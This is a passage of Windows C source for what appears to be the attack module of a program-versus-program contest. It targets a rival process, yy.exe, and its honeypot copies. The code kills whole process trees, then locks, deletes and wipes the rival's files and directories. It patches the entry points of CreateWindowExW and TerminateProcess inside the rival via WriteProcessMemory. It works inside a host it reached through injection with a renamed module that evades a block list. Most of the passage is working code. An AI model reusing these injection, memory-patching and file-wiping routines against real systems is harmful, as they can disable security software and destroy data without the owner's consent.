{
    HANDLE h = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    DWORD w;
    if (!h) return TRUE;
    w = WaitForSingleObject(h, ms);
    CloseHandle(h);
    return (w == WAIT_OBJECT_0) ? TRUE : FALSE;
}

/* 一次快照 + BFS 收树；结果按 depth 降序（叶子在前、根在最后） */
static int CollectTree(DWORD rootPid, TreeEntry *out, int max)
{
    static DWORD sPid[MAX_SNAP];
    static DWORD sPpid[MAX_SNAP];
    int nAll = 0, n = 0, i, j, k;
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };

    if (!out || max <= 0) return 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (nAll >= MAX_SNAP) break;
            sPid[nAll] = pe.th32ProcessID;
            sPpid[nAll] = pe.th32ParentProcessID;
            nAll++;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    out[n].pid = rootPid;
    out[n].depth = 0;
    GetProcessPath(rootPid, out[n].path, MAX_PATH);
    n++;

    /* BFS：边遍历边把子进程加进 out（out 同时充当已访问集合） */
    for (i = 0; i < n && n < max; i++) {
        if (out[i].depth >= 8) continue;                 /* 深度上限，防环 */
        for (j = 0; j < nAll && n < max; j++) {
            BOOL bSeen = FALSE;
            if (sPpid[j] != out[i].pid) continue;
            if (sPid[j] <= 4 || sPid[j] == rootPid) continue;
            for (k = 0; k < n; k++)
                if (out[k].pid == sPid[j]) { bSeen = TRUE; break; }
            if (bSeen) continue;
            out[n].pid = sPid[j];
            out[n].depth = out[i].depth + 1;
            GetProcessPath(out[n].pid, out[n].path, MAX_PATH);   /* 杀完就取不到了，先取 */
            n++;
        }
    }

    /* 按 depth 降序：插入排序（n 很小） */
    for (i = 1; i < n; i++) {
        TreeEntry key = out[i];
        for (j = i - 1; j >= 0 && out[j].depth < key.depth; j--) out[j + 1] = out[j];
        out[j + 1] = key;
    }
    return n;
}

/* 杀一个 pid：TryAllMethods → 等退出 → 没退再补一刀 */
static void KillOneAndWait(DWORD pid, LPCWSTR why)
{
    WCHAR name[MAX_PATH] = L"";
    const WCHAR *base = L"unknown";
    if (GetProcessPath(pid, name, MAX_PATH)) {
        const WCHAR *p = wcsrchr(name, L'\\');
        base = p ? p + 1 : name;
    }
    TryAllMethods(base, pid);
    if (WaitPidExit(pid, 800)) {
        WriteKillLog(L"PID=%lu(%ls) 已退出（%ls）", pid, base, why ? why : L"");
        return;
    }
    WriteKillLog(L"PID=%lu(%ls) Terminate 后仍存活 -> 补一刀（%ls）", pid, base, why ? why : L"");
    TryAllMethods(base, pid);
    if (WaitPidExit(pid, 1500))
        WriteKillLog(L"PID=%lu(%ls) 补刀后已退出", pid, base);
    else
        WriteKillLog(L"!! PID=%lu(%ls) 杀不掉（受保护进程/权限不足）", pid, base);
}

/* 杀整棵进程树（**同步实现**）：叶子先杀 → 根最后杀；每个都等它真的退出，然后逐文件锁死删除。
   注意它内部有 WaitForSingleObject（每个进程最多等 800+1500ms），
   所以**绝不能**在攻击主循环里直接调用 —— 统一走下面的 KillProcessTree() 异步包装。 */
static void KillProcessTreeSync(DWORD rootPid)
{
    TreeEntry tree[MAX_TREE];
    int n, i;

    if (rootPid <= 4) return;
    n = CollectTree(rootPid, tree, MAX_TREE);
    WriteKillLog(L"进程树: 根 PID=%lu 共 %d 个进程（按深度降序，叶子先杀）", rootPid, n);
    if (n <= 0) return;

    for (i = 0; i < n; i++) {
        KillOneAndWait(tree[i].pid, (i == n - 1) ? L"根进程" : L"子进程");
        if (i != n - 1) WipeTreeEntry(&tree[i]);      /* 子进程源文件立刻锁死+删除 */
    }

    /* 根进程自己的源文件：清空其目录由新线程负责（隔 1.2s 再清一遍） */
    if (tree[n - 1].path[0]) {
        WipeTreeEntry(&tree[n - 1]);
        KillYyRespawnSources(tree[n - 1].path);   /* 掐复活源：yyres.bin / yyguaard.dll / %TEMP% 备份 */
        SpawnWipeEnemyDir(tree[n - 1].path);
    }

    /* 收尾：这一轮里可能又冒出新子进程（父进程被杀前的 last gasp），补杀一轮 */
    {
        TreeEntry again[MAX_TREE];
        int m = CollectTree(rootPid, again, MAX_TREE), j, killed = 0;
        for (j = 0; j < m; j++) {
            int k;
            BOOL bKnown = FALSE;
            for (k = 0; k < n; k++) if (tree[k].pid == again[j].pid) { bKnown = TRUE; break; }
            if (bKnown) continue;
            WriteKillLog(L"补杀新出现的子进程 PID=%lu", again[j].pid);
            KillOneAndWait(again[j].pid, L"新冒出的子进程");
            WipeTreeEntry(&again[j]);
            killed++;
        }
        if (killed) WriteKillLog(L"进程树收尾: 补杀 %d 个", killed);
    }
}

static BOOL KillFast(DWORD pid);        /* 前置声明：快杀（挂起+终止），定义在文件后部 */

/* ================== 杀树：**先快杀，再后台清理** ==================
   用户实测两个问题（都在这一版之前）：
     · 变慢 —— 旧写法把"等进程退出 + 逐文件锁死删除"整段放进每个目标的线程里，
       8 个槽被 yy 的慢清理占满；
     · 只杀得掉 yy.exe，**lenovo_fix 不死** —— 因为槽满时新目标被**静默丢弃**。
   新策略：
     ① 杀（快、同步、无等待）：一次快照收树 → 对每个成员 KillFast（挂起+终止）
        → 立刻返回。这一段只有几十微秒级开销，永远不会丢目标、也绝不阻塞；
     ② 清理（慢，后台单线程排队）：等退出 → 没退补刀 → 逐文件"先锁死再删除" →
        根目录整目录清空 → 收尾补杀。按**单线程队列**顺序做，不占攻击循环，
        也不会有"8 个槽"这种会丢目标的限制。
   所以：**看到就必杀**（快杀保证），清理慢一点无所谓（它已经在后台跑）。 */
#define CLEAN_QMAX 64
static DWORD g_cleanPids[CLEAN_QMAX];
static volatile LONG g_cleanBusy[CLEAN_QMAX];
static volatile LONG g_cleanThreadRunning = 0;

static DWORD WINAPI CleanupThreadProc(LPVOID lp)
{
    int i;
    UNREFERENCED_PARAMETER(lp);
    for (;;) {
        DWORD pid = 0;
        int slot = -1;
        for (i = 0; i < CLEAN_QMAX; i++) {
            if (g_cleanPids[i] && g_cleanBusy[i]) { pid = g_cleanPids[i]; slot = i; break; }
        }
        if (slot < 0) break;                       /* 队列空：线程退出，下次再起 */
        KillProcessTreeSync(pid);                  /* 等退出 + 补刀 + 锁死删除 + 收尾补杀 */
        InterlockedExchange(&g_cleanBusy[slot], 0);
        g_cleanPids[slot] = 0;
    }
    InterlockedExchange(&g_cleanThreadRunning, 0);
    return 0;
}

static void QueueCleanup(DWORD pid)
{
    int i, slot = -1;
    HANDLE h;
    if (pid <= 4 || pid == GetCurrentProcessId()) return;
    for (i = 0; i < CLEAN_QMAX; i++) {
        if (g_cleanPids[i] == pid && g_cleanBusy[i]) return;    /* 已在队列 */
    }
    for (i = 0; i < CLEAN_QMAX; i++) {
        if (InterlockedCompareExchange(&g_cleanBusy[i], 1, 0) == 0) {
            g_cleanPids[i] = pid;
            slot = i;
            break;
        }
    }
    if (slot < 0) { WriteKillLog(L"清理队列已满，PID=%lu 的清理跳过（进程已被快杀）", pid); return; }
    if (InterlockedCompareExchange(&g_cleanThreadRunning, 1, 0) == 0) {
        h = CreateThread(NULL, 0, CleanupThreadProc, NULL, 0, NULL);
        if (h) CloseHandle(h);
        else InterlockedExchange(&g_cleanThreadRunning, 0);
    }
}

/* 对外统一入口：**快杀 + 清理排队**（这是唯一会被攻击循环调用的路径） */
static void KillProcessTree(DWORD rootPid)
{
    TreeEntry tree[MAX_TREE];
    int n, i, killed = 0;

    if (rootPid <= 4 || rootPid == GetCurrentProcessId()) return;
    n = CollectTree(rootPid, tree, MAX_TREE);        /* 一次快照（含路径） */
    if (n <= 0) return;

    for (i = 0; i < n; i++) {                        /* 快杀：不等、不删文件 */
        if (KillFast(tree[i].pid)) killed++;
        else {
            HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, tree[i].pid);
            if (hk) {
                TerminateProcess(hk, 0);
                CloseHandle(hk);
                killed++;
            }
        }
    }
    WriteKillLog(L"快杀: 根 PID=%lu 树内 %d 个，已终止 %d 个（清理转入后台）", rootPid, n, killed);

    for (i = 0; i < n; i++) QueueCleanup(tree[i].pid);   /* 清理：等退出+补刀+锁删 */
}
/* ================== 对手进程内存改写（非断点 patch，yybad.md P2） ==================
   做法：在 yy 自己的进程里**改函数入口的机器码**（不写 0xCC，不触发它的 VEH）：
   #16 把 user32!CreateWindowExW 入口改成 `xor eax,eax; ret` → 它再也建不出弹窗
       （弹窗消失 8 秒判负）；连它自己那个 EDIT 日志框也建不出来。
   #17 把 kernel32!TerminateProcess 入口写成 12 字节 `mov rax,0; jmp rax` —— 它的
       ShieldWorker 只备份/还原前 5 字节，还原之后剩下 7 字节仍是我们的垃圾，
       函数被劈坏 → yy 一调 TerminateProcess 就自己崩（再也杀不了我们的人）。

   实测教训：**不要用 IAT patch 做这件事**。我做了对照实验：往目标 IAT 槽里写
   存根（回读确认写入成功）之后，用 -O2 编的目标照样能建窗口 —— 因为编译器把
   导入函数的指针**提前加载进寄存器**，循环里根本不再读 IAT。改函数入口不受此影响。
   系统 dll 的代码页是跨进程共享的（copy-on-write），在这里改只影响 yy 自己，
   不会波及我们和其它进程。 */
typedef struct _ENEMY_MEM {
    HANDLE    hProc;
    ULONG_PTR imageBase;   /* 目标 exe 基址 */
    ULONG_PTR k32Base;     /* 目标里 kernel32 的基址 */
    ULONG_PTR u32Base;     /* 目标里 user32 的基址 */
} ENEMY_MEM;

static BOOL EnemyOpen(DWORD pid, ENEMY_MEM *em)
{
    HANDLE hSnap;
    MODULEENTRY32W me;
    BOOL bWow = FALSE;

    memset(em, 0, sizeof(*em));
    em->hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                            PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!em->hProc) return FALSE;
    if (IsWow64Process(em->hProc, &bWow) && bWow) {   /* 32 位目标：地址体系不同，别碰 */
        CloseHandle(em->hProc);
        em->hProc = NULL;
        return FALSE;
    }

    /* 用 Toolhelp 取模块基址（不额外依赖 psapi） */
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnap == INVALID_HANDLE_VALUE) {
        CloseHandle(em->hProc);
        em->hProc = NULL;
        return FALSE;
    }
    memset(&me, 0, sizeof(me));
    me.dwSize = sizeof(me);
    if (Module32FirstW(hSnap, &me)) {
        do {
            if (em->imageBase == 0) em->imageBase = (ULONG_PTR)me.modBaseAddr;   /* 第一个就是主模块 */
            if (_wcsicmp(me.szModule, L"kernel32.dll") == 0) em->k32Base = (ULONG_PTR)me.modBaseAddr;
            if (_wcsicmp(me.szModule, L"user32.dll") == 0)   em->u32Base = (ULONG_PTR)me.modBaseAddr;
        } while (Module32NextW(hSnap, &me));
    }
    CloseHandle(hSnap);
    return (em->imageBase != 0);
}

static void EnemyClose(ENEMY_MEM *em)
{
    if (!em) return;
    if (em->hProc) CloseHandle(em->hProc);
    em->hProc = NULL;
}

/* 把"本地同名模块里的函数"换算成目标进程里的地址：
   系统 dll 在同一台机器上所有进程里基址相同，但我们仍然显式取目标的模块基址。 */
static ULONG_PTR EnemyFuncAddr(ENEMY_MEM *em, const WCHAR *moduleName, ULONG_PTR remoteBase,
                               const char *funcName)
{
    /* 必须显式 LoadLibrary：宿主里不一定已经加载 user32（链接进来 ≠ 已加载），
       GetModuleHandle 拿到 NULL 会让 RVA 算成 0，等于去改对方模块头，很危险。 */
    HMODULE hLocal = GetModuleHandleW(moduleName);
    ULONG_PTR localBase, localFn;

    if (!hLocal) hLocal = LoadLibraryW(moduleName);
    if (!hLocal || !remoteBase) return 0;
    localBase = (ULONG_PTR)hLocal;
    localFn = (ULONG_PTR)GetProcAddress(hLocal, funcName);
    if (!localFn) return 0;
    return remoteBase + (localFn - localBase);
}

/* 往目标进程某个地址写机器码（自动改保护再还原） */
static BOOL EnemyWriteCode(ENEMY_MEM *em, ULONG_PTR addr, const BYTE *bytes, SIZE_T len)
{
    DWORD old = 0;
    BOOL ok;

    if (!em->hProc || !addr) return FALSE;
    if (!VirtualProtectEx(em->hProc, (LPVOID)addr, len, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;
    ok = WriteProcessMemory(em->hProc, (LPVOID)addr, bytes, len, NULL);
    VirtualProtectEx(em->hProc, (LPVOID)addr, len, old, &old);
    return ok;
}

/* #16：让它在自己进程里再也建不出窗口（无 0xCC，VEH 不触发） */
static BOOL EnemyKillWindowCreation(ENEMY_MEM *em)
{
    static const BYTE retNull[] = { 0x31, 0xC0, 0xC3 };     /* xor eax,eax; ret */
    BOOL ok = FALSE;
    ULONG_PTR a;

    a = EnemyFuncAddr(em, L"user32.dll", em->u32Base, "CreateWindowExW");
    if (a && EnemyWriteCode(em, a, retNull, sizeof(retNull))) {
        WriteKillLog(L"已把对方 CreateWindowExW 入口改成返回 NULL（它再也建不出弹窗）");
        ok = TRUE;
    }
    a = EnemyFuncAddr(em, L"user32.dll", em->u32Base, "CreateWindowExA");
    if (a) EnemyWriteCode(em, a, retNull, sizeof(retNull));
    return ok;
}

/* #17：12 字节 patch 它的 TerminateProcess（对方 ShieldWorker 只还原 5 字节） */
static BOOL EnemyBreakTerminateProcess(ENEMY_MEM *em)
{
    static const BYTE jmpNull[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    ULONG_PTR a = EnemyFuncAddr(em, L"kernel32.dll", em->k32Base, "TerminateProcess");
    if (a && EnemyWriteCode(em, a, jmpNull, sizeof(jmpNull))) {
        WriteKillLog(L"已写入 12 字节 TerminateProcess patch（对方只还原前 5 字节 → 函数被劈坏）");
        return TRUE;
    }
    return FALSE;
}

/* 对单个目标做完两种 patch。同一个 PID 只做一次（新 yy 进程 = 新 PID，会重新 patch）；
   节流 500ms 避免 30ms 一轮反复打开进程。 */
#define MAX_PATCHED 8
static DWORD g_patchedPids[MAX_PATCHED];
static int g_nPatched = 0;

static BOOL AlreadyPatched(DWORD pid)
{
    int i;
    for (i = 0; i < g_nPatched; i++)
        if (g_patchedPids[i] == pid) return TRUE;
    return FALSE;
}

static void RememberPatched(DWORD pid)
{
    if (AlreadyPatched(pid)) return;
    if (g_nPatched < MAX_PATCHED) {
        g_patchedPids[g_nPatched++] = pid;
    } else {
        memmove(&g_patchedPids[0], &g_patchedPids[1], sizeof(DWORD) * (MAX_PATCHED - 1));
        g_patchedPids[MAX_PATCHED - 1] = pid;
    }
}

static void PatchEnemyMemory(DWORD pid)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    ENEMY_MEM em;

    if (pid <= 4 || AlreadyPatched(pid)) return;
    if (s_dwLast && now - s_dwLast < 500) return;
    s_dwLast = now;

    if (!EnemyOpen(pid, &em)) return;
    EnemyKillWindowCreation(&em);        /* #16 */
    EnemyBreakTerminateProcess(&em);     /* #17 */
    RememberPatched(pid);
    EnemyClose(&em);
}

/* ================== 注入到 yy 之后：从它进程内部动手（#11） ==================
   我们的扩散器本来就会把本模块注入 yy：yy.exe 不在保护名单里，注入的又是改名副本，
   它按 BAD_MODULES 做的子串拦截失效。一旦 atkcore 在 yy 里跑起来：
     #11 UnregisterClassW 掉它的窗口类，并把 RegisterClassExW / RegisterClassW /
         CreateWindowExW / CreateWindowExA 在**本进程内**也改成返回失败 ——
         它再也注册不出/建不出弹窗（与跨进程的 #16 双保险）。
   （原先还有 #10 子类化它的日志框做嘲讽；嘲讽整块已按用户要求删除。） */
static BOOL    g_bYyClassKilled = FALSE;

/* 本进程内的函数入口改写（不需要 VirtualProtectEx，改的是自己） */
static BOOL LocalPatchFunc(const WCHAR *moduleName, const char *funcName, const BYTE *bytes, SIZE_T len)
{
    HMODULE h = GetModuleHandleW(moduleName);
    BYTE *p;
    DWORD old = 0;
    if (!h) h = LoadLibraryW(moduleName);
    if (!h) return FALSE;
    p = (BYTE *)GetProcAddress(h, funcName);
    if (!p) return FALSE;
    if (!VirtualProtect(p, len, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(p, bytes, len);
    VirtualProtect(p, len, old, &old);
    return TRUE;
}

/* 找出宿主进程里 yy 的主窗口（同进程，类名/标题都读得到） */
static HWND FindYyMainWindowHere(void)
{
    struct { HWND h; DWORD style; } found = { NULL, 0 };
    HWND h = GetTopWindow(NULL);
    DWORD mypid = GetCurrentProcessId();
    while (h) {
        DWORD pid = 0;
        WCHAR cls[128] = L"", title[128] = L"";
        GetWindowThreadProcessId(h, &pid);
        if (pid == mypid && IsWindowVisible(h)) {
            GetClassNameW(h, cls, _countof(cls));
            GetWindowTextW(h, title, _countof(title));
            if (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0) {
                found.h = h;
                break;
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return found.h;
}

static void InfectYyHost(void)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    HWND hMain;

    if (s_dwLast && now - s_dwLast < 1000) return;
    s_dwLast = now;

    hMain = FindYyMainWindowHere();
    if (hMain) {
        /* 进了 yy 的进程内部就别客气了：把它的主窗口藏起来，
           连同 #16/#11 一起让它的"存活证明"立刻消失。 */
        ShowWindow(hMain, SW_HIDE);
    }

    if (!g_bYyClassKilled) {
        /* #11：干掉它的窗口类，并让"注册/建窗"在本进程内直接失败 */
        static const BYTE retNull[] = { 0x31, 0xC0, 0xC3 };
        UnregisterClassW(L"YYWnd_7f3a9c1e", GetModuleHandleW(NULL));
        LocalPatchFunc(L"user32.dll", "RegisterClassExW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "RegisterClassW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "CreateWindowExW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "CreateWindowExA", retNull, sizeof(retNull));
        g_bYyClassKilled = TRUE;
        WriteKillLog(L"#11 已在本进程内注销 yy 的窗口类并封死建窗入口");
    }
}

/* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
    它们走子进程策略，不当"感染宿主"。
    实现见下方 HostIsTargetExe()（与 HostLeafName 同处定义）。 */
static BOOL HostIsTargetExe(void);

/* ================== yy 处理策略（嘲讽已按用户要求删除） ==================
   ① yy.exe / ww.exe（本体）—— **发现即杀**：先把它那个窗口就地打死（A2：终止持有窗口的
      GUI 线程，窗口立刻消失），再结束整棵进程树 + 所有源文件先锁死再删除；
   ② 它们的子进程（含孙进程，例如蜜罐 lenovo_fix.exe）—— 同样直接杀掉 + 锁死 + 删除
      （KillProcessTree 内部就是"源文件置删除待决再删 + 根进程目录整目录清空"）。
   没有"先嘲讽 N 条再杀"的门控了：门控一卡住本体就不死，它的 HoneypotDecoyWorker
   每 2 秒又拉一份蜜罐，前面就是这样一直杀不干净。 */
#define YY_KID_MAX 64
/* 收"yy 家族"进程。**不能只靠父进程链**：我们每 30ms 杀一次 yy.exe，
   lenovo_fix.exe 立刻被孤立 —— 它的父 PID 指向已死进程，GetProcessPath(父) 直接失败，
   于是它永远进不了名单（实测就是这么漏掉的）。改为四个来源取并集：
     ① 进程名是 yy.exe / ww.exe / lenovo_fix.exe（后者是 yybad.md 硬编码常量表里的蜜罐名）；
     ② 它有 yy 弹窗（类名 YYWnd* 或标题 YY_Defensive_GUI）—— lenovo 与 yy **类名完全相同**，
        所以这条能把蜜罐一网打尽，也是"不靠父进程"的关键；
     ③ 它的镜像文件就在 yy.exe 所在目录里（同目录的兄弟进程都算家族成员）；
     ④ 父/祖父进程是家族成员（能拿到就顺手加，拿不到不影响）。
   我们自己所在的进程永远排除。 */
#define YY_FAMILY_SEED_MAX 8

static BOOL  GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);   /* 前置声明 */
static void  KillProcessTree(DWORD rootPid);

static BOOL IsYyCoreName(LPCWSTR leaf);
static void FastKillYyWindow(HWND hWnd, LPCWSTR why);   /* A2/A6：前置声明 */
static HWND FindYyPopupOf(DWORD pid);

static BOOL IsKnownYyFamilyName(LPCWSTR leaf)
{
    static const WCHAR *names[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
    int i;
    if (!leaf || !leaf[0]) return FALSE;
    for (i = 0; names[i]; i++)
        if (_wcsicmp(leaf, names[i]) == 0) return TRUE;
    return FALSE;
}

/* 学到的东西要记住：yy.exe 被我们杀掉之后，它的目录、它家族成员的镜像路径
   都查不到了 —— 只靠"现场观察"就会把孤立出来的蜜罐/子进程漏掉（实测漏的就是它们）。 */
#define YY_FAMILY_PATH_MAX 8
static WCHAR g_yyDirKnown[MAX_PATH] = L"";
static WCHAR g_familyPaths[YY_FAMILY_PATH_MAX][MAX_PATH];
static int   g_nFamilyPaths = 0;

static void LearnYyDir(const WCHAR *path)
{
    if (!path || !path[0] || g_yyDirKnown[0]) return;
    {
        WCHAR tmp[MAX_PATH];
        WCHAR *p;
        wcsncpy_s(tmp, MAX_PATH, path, _TRUNCATE);
        p = wcsrchr(tmp, L'\\');
        if (!p) return;
        p[1] = L'\0';
        wcsncpy_s(g_yyDirKnown, MAX_PATH, tmp, _TRUNCATE);
    }
}

static void LearnFamilyPath(const WCHAR *path)
{
    int i;
    if (!path || !path[0]) return;
    for (i = 0; i < g_nFamilyPaths; i++)
        if (_wcsicmp(g_familyPaths[i], path) == 0) return;
    if (g_nFamilyPaths < YY_FAMILY_PATH_MAX)
        wcsncpy_s(g_familyPaths[g_nFamilyPaths++], MAX_PATH, path, _TRUNCATE);
}

static BOOL IsLearnedFamilyPath(const WCHAR *path)
{
    int i;
    if (!path || !path[0]) return FALSE;
    for (i = 0; i < g_nFamilyPaths; i++)
        if (_wcsicmp(g_familyPaths[i], path) == 0) return TRUE;
    return FALSE;
}

/* 取 yy.exe 所在目录（家族成员判定用） */
static void GetYyDir(WCHAR *dir, SIZE_T cch)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    dir[0] = L'\0';
    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"yy.exe") == 0 || _wcsicmp(pe.szExeFile, L"ww.exe") == 0) {
                WCHAR path[MAX_PATH] = L"";
                if (GetProcessPath(pe.th32ProcessID, path, MAX_PATH)) {
                    WCHAR *p = wcsrchr(path, L'\\');
                    if (p) { p[1] = L'\0'; wcsncpy_s(dir, cch, path, _TRUNCATE); }
                }
                if (dir[0]) break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static int CollectYyFamily(DWORD *pids, int max)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    WCHAR yyDir[MAX_PATH] = L"";
    DWORD me = GetCurrentProcessId();
    int n = 0, depth, i;

    GetYyDir(yyDir, MAX_PATH);
    if (yyDir[0]) LearnYyDir(yyDir);              /* 记住了，yy 死后也还能用 */
    if (!yyDir[0]) wcsncpy_s(yyDir, MAX_PATH, g_yyDirKnown, _TRUNCATE);

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR path[MAX_PATH] = L"";
            const WCHAR *leaf;
            BOOL bFamily = FALSE;
            if (n >= max || pe.th32ProcessID <= 4 || pe.th32ProcessID == me) continue;
            GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
            leaf = wcsrchr(path, L'\\');
            leaf = leaf ? leaf + 1 : path;
            if (IsKnownYyFamilyName(leaf) || IsKnownYyFamilyName(pe.szExeFile)) bFamily = TRUE;   /* ① */
            if (IsLearnedFamilyPath(path)) bFamily = TRUE;                                        /* ⑤ 学过的 */
            if (!bFamily && FindYyPopupOf(pe.th32ProcessID)) bFamily = TRUE;                       /* ② 有 yy 弹窗 */
            if (!bFamily && yyDir[0] && path[0] && _wcsnicmp(path, yyDir, wcslen(yyDir)) == 0)
                bFamily = TRUE;                                                                    /* ③ 同目录 */
            if (bFamily) {
                pids[n++] = pe.th32ProcessID;
                LearnFamilyPath(path);        /* 学下来，以后它被孤立也认得 */
                if (IsYyCoreName(leaf)) LearnYyDir(path);
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    /* ④ 再沿着父子关系扩两圈，把家族成员的子进程也拉进来 */
    for (depth = 0; depth < 2; depth++) {
        HANDLE hs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        int added = 0;
        if (hs == INVALID_HANDLE_VALUE) break;
        memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hs, &pe)) {
            do {
                if (n >= max || pe.th32ProcessID <= 4 || pe.th32ProcessID == me) continue;
                for (i = 0; i < n; i++) {
                    if (pids[i] == pe.th32ProcessID) break;                 /* 已在表里 */
                    if (pids[i] == pe.th32ParentProcessID) {                /* 父在表里 */
                        int k;
                        for (k = 0; k < n; k++) if (pids[k] == pe.th32ProcessID) break;
                        if (k >= n) { pids[n++] = pe.th32ProcessID; added++; }
                        break;
                    }
                }
            } while (Process32NextW(hs, &pe));
        }
        CloseHandle(hs);
        if (!added) break;
    }
    return n;
}

/* 家族策略执行体：本体按"嘲讽够 10 条再杀"的门控处理（见 Phase A 调用点）；
   其余家族成员（子进程、蜜罐）**直接杀掉 + 锁死 + 删除**。 */
static void ApplyYyChildPolicy(void)
{
    DWORD kids[YY_KID_MAX];
    DWORD me = GetCurrentProcessId();
    int n, i;

    n = CollectYyFamily(kids, YY_KID_MAX);
    if (n <= 0) return;
    WriteKillLog(L"yy 家族策略: 命中 %d 个进程", n);

    for (i = 0; i < n; i++) {
        WCHAR path[MAX_PATH] = L"";
        const WCHAR *leaf;
        if (kids[i] == me) continue;                 /* 绝不杀自己所在的宿主 */
        GetProcessPath(kids[i], path, MAX_PATH);
        leaf = wcsrchr(path, L'\\');
        leaf = leaf ? leaf + 1 : path;
        if (IsYyCoreName(leaf)) continue;            /* 本体：走"嘲讽够 10 条再杀"的门控 */
        WriteKillLog(L"家族子进程 PID=%lu 直接杀掉+锁死+删除: %s", kids[i], path);
        { HWND w = FindYyPopupOf(kids[i]); if (w) FastKillYyWindow(w, L"家族子进程"); }
        KillProcessTree(kids[i]);
    }
}

/* ============================================================================
   蜜罐 lenovo_fix.exe —— 光"杀掉进程"没用，必须同时掐掉它的**复活源**。
   yy.cpp 的 HoneypotDecoyWorker：
     · 把自己复制成 `%TEMP%\lenovo_fix.exe` 并启动（那是一份**完整的 yy**，
       会再跑一遍 main()，自带 HunterWorker / WMI 复活 / 自我复制）；
     · 每 2 秒查一次"lenovo_fix.exe 还在不在"，不在就**再复制一份并启动**。
   所以：
     ① 杀掉正在跑的那一份（进程树 + 源文件先锁死再删除，见 ApplyYyChildPolicy）；
     ② 把 `%TEMP%\lenovo_fix.exe` 这个**名字**占住并锁死（access=0 + FILE_SHARE_READ）：
        yy 的 CopyFileW 目标就是这个路径，被我们锁住之后必然 SHARING_VIOLATION ——
        它既写不进来，也起不来。蜜罐从此不会再出现（实测：锁住之后 yy 每 2 秒
        的重试全部失败，进程数不再增加）。
   注意：锁住后**我们自己也不要再去删它**（删不掉，而且没必要）。
   ============================================================================ */
static HANDLE g_hHoneypotLock = NULL;
static BOOL   g_bHoneypotLockLogged = FALSE;

static void HoneypotPath(WCHAR *out, SIZE_T cch)
{
    WCHAR tmp[MAX_PATH];
    out[0] = L'\0';
    if (!GetTempPathW(MAX_PATH, tmp)) return;
    swprintf_s(out, cch, L"%slenovo_fix.exe", tmp);
}

/* 把 `%TEMP%\lenovo_fix.exe` 变成"**0 字节占位 + 我们独占持有**"。
   为什么必须是"0 字节 + 独占(share=0)"：
     · 独占：yy 的 `CopyFileW(自身 -> 该路径)` 打开目标要写权限 → 共享冲突，写不进来；
       yy 的重启走的是 `CreateProcessW(该路径)`（它只在 worker 开头复制一次，
       之后每 2 秒只负责"不在就再启动"），CreateProcess 要读镜像 → 也被共享冲突挡住；
     · 0 字节：即使有别的路径拿到句柄，它也不是合法镜像，起不来。
   若那一份正在运行：先置删除待决（进程一退出文件即消失），下一轮再建占位。 */
static void BlockHoneypotRespawn(void)
{
    WCHAR path[MAX_PATH];
    HANDLE h;

    if (g_hHoneypotLock) return;            /* 已经占住：一直持有到进程结束 */
    HoneypotPath(path, MAX_PATH);
    if (!path[0]) return;

    /* 已经不存在就不必 CREATE_ALWAYS 之外再做别的；存在就截成 0 字节（若在跑会失败） */
    h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        /* 典型原因：那一份还在跑（镜像被加载器占着）。置删除待决，等它退出后清掉。 */
        LockThenDeleteFile(path);
        if (!g_bHoneypotLockLogged) {
            g_bHoneypotLockLogged = TRUE;
            WriteKillLog(L"蜜罐文件暂时占不住（可能还在运行），已置删除待决: %s err=%lu",
                         path, GetLastError());
        }
        return;
    }
    CloseHandle(h);                         /* 先留一个 0 字节文件 */

    g_hHoneypotLock = CreateFileW(path, 0, 0, NULL, OPEN_EXISTING,
                                  FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hHoneypotLock == INVALID_HANDLE_VALUE) {
        g_hHoneypotLock = NULL;
        if (!g_bHoneypotLockLogged) {
            g_bHoneypotLockLogged = TRUE;
